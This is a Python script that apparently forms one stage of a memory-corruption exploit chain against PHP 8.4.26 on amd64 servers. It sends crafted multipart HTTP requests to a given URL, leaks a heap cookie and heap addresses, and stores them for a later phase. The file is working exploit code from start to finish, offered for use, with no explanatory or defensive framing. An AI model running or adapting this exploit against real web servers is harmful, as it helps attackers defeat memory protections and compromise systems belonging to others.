#!/usr/bin/env python3
"""Prepare the calibrated second disclosure and stop after its OOM request."""

from __future__ import annotations

import argparse
import dataclasses
import json
from pathlib import Path
import sys
import time


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--profile-json")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument(
        "--phase2-set",
        action="append",
        default=[],
        dest="phase2_assignments",
    )
    parser.add_argument("--output-dir", required=True, type=Path)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", args.profile_json, args.assignments
    )
    phase2_profile = exploit.load_profile(
        "php-8.4.26-amd64",
        args.profile_json,
        args.assignments + args.phase2_assignments,
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )
    args.output_dir.mkdir(parents=True, exist_ok=True)

    def post(name: str, body: bytes, boundary: bytes, *, expected_abort: bool = False) -> bytes:
        response = client.post_multipart(body, boundary, expected_abort=expected_abort)
        (args.output_dir / f"{name}.response").write_bytes(response)
        first_line = response.splitlines()[0] if response else b""
        print(f"{name}: {first_line.decode('latin1', 'replace')} bytes={len(response)}", flush=True)
        return response

    body, boundary = exploit.build_off_a(profile)
    post("heap-a", body, boundary, expected_abort=True)
    body, boundary = exploit.build_heap_b(profile)
    response = post("heap-b", body, boundary)
    cached, main_heap, cookie = exploit.parse_heap_cookie(
        response, profile, exploit.Log(1), False, attempt_label=" (phase2 prep)"
    )
    (args.output_dir / "heap-cookie.bin").write_bytes(cookie)

    body, boundary = exploit.build_rotation_a(profile)
    post("rotate-a", body, boundary, expected_abort=True)
    time.sleep(0.2)
    body, boundary = exploit.build_rotation_b()
    post("rotate-b", body, boundary, expected_abort=True)
    time.sleep(0.5)

    body, boundary = exploit.build_off_a(phase2_profile)
    post("libphp-a", body, boundary, expected_abort=True)
    result = {"cached_heap": hex(cached), "main_heap": hex(main_heap)}
    (args.output_dir / "phase2-a.json").write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
